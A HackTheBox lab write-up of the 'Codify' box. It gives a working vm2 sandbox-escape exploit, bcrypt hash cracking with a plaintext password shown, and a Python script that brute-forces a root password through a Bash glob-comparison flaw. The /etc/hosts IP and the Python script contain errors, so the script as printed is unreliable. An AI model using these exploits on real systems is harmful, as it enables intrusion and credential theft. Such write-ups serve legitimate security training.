
## Reconnaissance

To start, I added the IP address to /etc/hosts:

```
echo "10.10.14.239 codify.htb" | sudo tee -a /etc/hosts
```

## Nmap

```
sudo nmap -p- -sCV -A 10.10.11.239 -T4
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/23%OT=22%CT=1%CU=35741%PV=Y%DS=2%DC=T%G=Y%TM=65AEC18
OS:3%P=x86_64-pc-linux-gnu)SEQ(TI=Z%CI=Z%TS=C)SEQ(SP=101%GCD=1%ISR=10D%TI=Z
OS:%TS=A)SEQ(SP=FE%GCD=1%ISR=10D%TI=Z%CI=Z%TS=D)SEQ(SP=FE%GCD=1%ISR=10D%TI=
OS:Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M5                                                                                            
OS:52ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88                                                                                            
OS:%W5=FE88%W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T                                                                                            
OS:1(R=N)T1(R=Y%DF=Y%T=40%S=O%A=O%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=                                                                                            
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0                                                                                            
OS:%Q=)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%                                                                                            
OS:W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q                                                                                            
OS:=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=                                                                                            
OS:0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=                                                                                            
OS:0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=                                                                                            
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=                                                                                            
OS:40%CD=S)                                                                                         Network Distance: 2 hops                                                                                                                                             
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                        
TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   48.06 ms 10.10.14.1
2   48.11 ms 10.10.11.239

```



## Initial Foothold

I started off by browsing to codify.htb with Burp Suite enabled to intercept traffic. Exploring the web application revealed 3 main pages:

- About Us - This page explained that Codify is a Node.js sandbox environment using the vm2 library to execute untrusted code safely.
- Editor - A simple page with a textarea to enter Node.js code and execute it.
- Limitations - Notes restrictions like blocked access to certain modules like child_process and fs.

The About Us page indicated that while Codify sandboxes code execution, it's not completely bulletproof.

After some research into vm2, I found a recently disclosed Sandbox Escape vulnerability in [CVE-2023-30547](https://github.com/advisories/GHSA-ch3r-j5x3-6q2m) that could be leveraged to break out of the sandbox.

I tested a PoC exploit code in the textarea that abuses Proxy and Error objects to access the main process and execute arbitrary commands.

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'bash shell.sh'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));
```

This exploit allowed me to execute commands on the underlying system. 
![[Pasted image 20240123031510.png]]


## Privilege Escalation to Joshua

After gaining initial access to the Codify server as the svc user, I began searching for ways to escalate privileges and obtain access to the joshua user account, which I knew was there while enumeration the server.

### Discovering the tickets.db File

I started by thoroughly enumerating the file system. Buried within the web directory at /var/www/contact I noticed an interesting file named tickets.db.

Examining it revealed it was a SQLite database file owned by the svc user I was currently running as:

```
svc@codify:/var/www/contact$ ls -la tickets.db
-rw-r--r-- 1 svc svc 20480 Sep 12 17:45 tickets.db
```

### Extracting Credentials with strings

My next step was to extract any readable strings from the binary SQLite file using the strings utility:

```
svc@codify:/var/www/contact$ strings tickets.db

SQLite format 3
tabletickets
...
CREATE TABLE users ( 
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE, 
        password TEXT
    )
...
joshua
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

This revealed a bcrypt password hash for the user joshua.

### Cracking the Hash with John the Ripper

With a password hash in hand, I set out to crack it using John the Ripper. I first saved the hash to a file:

```
echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
```

Then I invoked John with the bcrypt format and rockyou wordlist:

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```

This successfully cracked the hash, revealing the password.

### Switching Users with su

With joshua's credentials, I was able to switch users and escalate privileges using the su command:

```
svc@codify:/var/www/contact$ su joshua
Password: spongebob1
joshua@codify:/var/www/contact$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
```

### Reading the User Flag

Finally, as the joshua user I could read the protected user flag in /home/joshua/user.txt:

```
joshua@codify:~$ cat user.txt
9c38**************************423ce
```

This complete process of privilege escalation allowed me to pivot from my initial limited svc access to full access as joshua and capture the flag.

## Privilege Escalation to Root

After becoming the joshua user, I continued searching for further privilege escalation opportunities.

### sudo Permissions

Checking sudo permissions with sudo -l revealed joshua could run this script as root:

```
joshua@codify:/opt/scripts$ sudo -l

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

### Analyzing /opt/scripts/mysql-backup.sh

```
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The vulnerability in the script is related to how the password confirmation is handled:

```
if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi
```

This section of the script compares the user-provided password (USER_PASS) with the actual database password (DB_PASS). The vulnerability here is due to the use of == inside [[ ]] in Bash, which performs pattern matching rather than a direct string comparison. This means that the user input (USER_PASS) is treated as a pattern, and if it includes glob characters like * or ?, it can potentially match unintended strings.

For example, if the actual password (DB_PASS) is password123 and the user enters * as their password (USER_PASS), the pattern match will succeed because * matches any string, resulting in unauthorized access.

This means we can bruteforce every char in the DB_PASS.

### Exploiting Pattern Matching

I wrote a Python script that exploits this by testing password prefixes and suffixes to slowly reveal the full password.

It builds up the password character by character, confirming each guess by invoking the script via sudo and checking for a successful run.

```
import string
import subproccess

def check_password(p):
	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
	result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)
	return "Password confirmed!" in result.stdout

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
	for char in charset:
		if check_password(password + char)
			password += char
			print(password)
			break
	else:
		is_password_found = True
```

### Obtaining Root Shell with su

With the backup password in hand, I was able to use su to switch to the root user:

```
joshua@codify:/tmp$ su root
Password:
root@codify:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:/tmp# ls -la ~
total 40
drwx------  5 root root 4096 Sep 26 09:35 .
drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..
lrwxrwxrwx  1 root root    9 Sep 14 03:26 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r--  1 root root   22 May  8  2023 .creds
drwxr-xr-x  3 root root 4096 Sep 26 09:35 .local
lrwxrwxrwx  1 root root    9 Sep 14 03:34 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Nov 14 07:14 root.txt
drwxr-xr-x  4 root root 4096 Sep 12 16:56 scripts
drwx------  2 root root 4096 Sep 14 03:31 .ssh
-rw-r--r--  1 root root   39 Sep 14 03:26 .vimrc
root@codify:/tmp# cat ~/root.txt
6845********************085a
```

## Conclusion

The Codify box on HackTheBox provided a comprehensive learning experience, demonstrating techniques like sandbox escape, password cracking, script analysis, brute forcing, and chaining multiple privilege escalation vectors.

Initial access was gained by exploiting a sandbox escape in the web application's sandboxed NodeJS code runner. Further enumeration revealed a password hash that ultimately allowed escalating from the low-privileged svc user to the user joshua.

The final pivoting point was a vulnerable MySQL backup script that could be abused via its weak password comparison logic. After writing an exploit to slowly reveal the script's admin password, I was able to obtain root access and complete control of the system.

Boxes like Codify exemplify the importance of thinking broadly across multiple domains like web apps, databases, scripts, authentication, and system administration. Developers have to secure every level, while hackers need only find one oversight. This makes comprehensive enumeration, lateral thinking, and chaining multiple techniques indispensable for aspiring hackers.